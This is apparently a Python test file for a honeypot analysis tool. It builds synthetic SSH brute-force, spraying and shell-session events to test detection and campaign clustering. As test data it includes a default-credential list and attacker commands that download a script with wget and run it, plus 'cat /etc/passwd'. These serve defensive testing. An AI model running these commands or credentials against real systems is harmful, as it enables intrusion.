"""Brute-force, spraying, campaign clustering, timing and burst detection on hand-made data."""

import itertools

from honeypot.analysis import bruteforce, campaigns, infrastructure, trends

T0 = 1_780_000_000.0
BOT_LIST = [("root", "123456"), ("root", "root"), ("admin", "admin"), ("root", "password"), ("ubuntu", "ubuntu"),
            ("pi", "raspberry"), ("test", "test"), ("oracle", "oracle"), ("root", "toor"), ("git", "git")]
counter = itertools.count()


def auth(ip, user, pw, ts, node="node-a"):
    return {"event_id": f"e{next(counter)}", "ts": ts, "sensor": "ssh", "event_type": "auth", "src_ip": ip,
            "username": user, "password": pw, "session_id": f"s-{ip}"}


def command(ip, cmd, ts, session):
    return {"event_id": f"e{next(counter)}", "ts": ts, "sensor": "ssh", "event_type": "command", "src_ip": ip,
            "command": cmd, "session_id": session}


def load(db):
    events = []
    # Three botnet IPs sharing one credential list, fast (one attempt per second).
    for n, ip in enumerate(["203.0.113.10", "203.0.113.11", "198.51.100.20"]):
        for i, (u, p) in enumerate(BOT_LIST):
            events.append(auth(ip, u, p, T0 + n * 1000 + i))
    # One sprayer: same password, twelve usernames, fast.
    for i in range(12):
        events.append(auth("192.0.2.50", f"user{i}", "Winter2026!", T0 + 5000 + i * 2))
    # A slow targeted guesser: one user, twelve passwords, 30 s apart (never 10 in a minute).
    for i in range(12):
        events.append(auth("192.0.2.77", "deploy", f"Deploy{i}!", T0 + 9000 + i * 30))
    # Two automated shell sessions with the same script, one human-paced session.
    script = ["uname -a", "cd /tmp; wget http://198.51.100.1/a.sh", "chmod +x a.sh", "./a.sh"]
    for ip in ("203.0.113.10", "203.0.113.11"):
        for j, c in enumerate(script):
            events.append(command(ip, c.replace("a.sh", f"{ip[-2:]}.sh"), T0 + 20000 + j * 0.2, f"sess-{ip}"))
    for j, (c, gap) in enumerate(zip(["w", "id", "cat /etc/passwd", "ls -la", "exit"], [0, 4, 15, 6, 22])):
        events.append(command("192.0.2.77", c, T0 + 30000 + sum([0, 4, 15, 6, 22][:j + 1]), "sess-human"))
    db.insert_events(events, "node-a")


def test_bruteforce_detection(db):
    load(db)
    out = bruteforce.detect(db, window=60, threshold=10)
    by_ip = {r["ip"]: r for r in out["ips"]}
    assert by_ip["203.0.113.10"]["brute_force"] is True
    assert by_ip["203.0.113.10"]["shape"] == "dictionary / credential stuffing"
    assert by_ip["192.0.2.50"]["brute_force"] and by_ip["192.0.2.50"]["shape"] == "password spraying"
    slow = by_ip["192.0.2.77"]
    assert not slow["brute_force"] and slow["low_and_slow"] and slow["shape"] == "targeted brute force"
    assert any(r["password"] == "Winter2026!" for r in bruteforce.spraying_targets(db))


def test_campaign_clustering(db):
    load(db)
    out = campaigns.analyse(db)
    groups = [set(c["ips"]) for c in out["campaigns"]]
    assert {"203.0.113.10", "203.0.113.11", "198.51.100.20"} in groups
    # The sprayer and the targeted guesser share nothing with the botnet.
    assert not any("192.0.2.50" in g for g in groups)
    assert campaigns.jaccard({1, 2, 3}, {2, 3, 4}) == 0.5


def test_command_normalisation_links_random_names():
    a = campaigns.normalise_command("cd /tmp; wget http://198.51.100.1/x8h2k.sh; /bin/busybox QWERTY")
    b = campaigns.normalise_command("cd /tmp; wget http://203.0.113.9/zz.sh; /bin/busybox ABCDE")
    assert a == b


def test_session_timing(db):
    load(db)
    kinds = {k["session_id"]: k["kind"] for k in infrastructure.session_kinds(db)}
    assert kinds["sess-203.0.113.10"] == "automated"
    assert kinds["sess-human"] == "human-like"


def test_burst_detection():
    quiet = [(i * 3600, 1 + i % 3) for i in range(48)]
    series = quiet[:30] + [(30 * 3600, 40)] + quiet[31:]
    bursts = trends.detect_bursts(series)
    assert [b["ts"] for b in bursts] == [30 * 3600]
    assert trends.detect_bursts(quiet) == []


def test_simulated_filter(db):
    db.insert_events([{**auth("203.0.113.99", "root", "x", T0), "simulated": True}], "node-a")
    assert bruteforce.detect(db, include_sim=True)["total_attempts"] == 1
    assert bruteforce.detect(db, include_sim=False)["total_attempts"] == 0
    assert db.purge_simulated()["events"] == 1
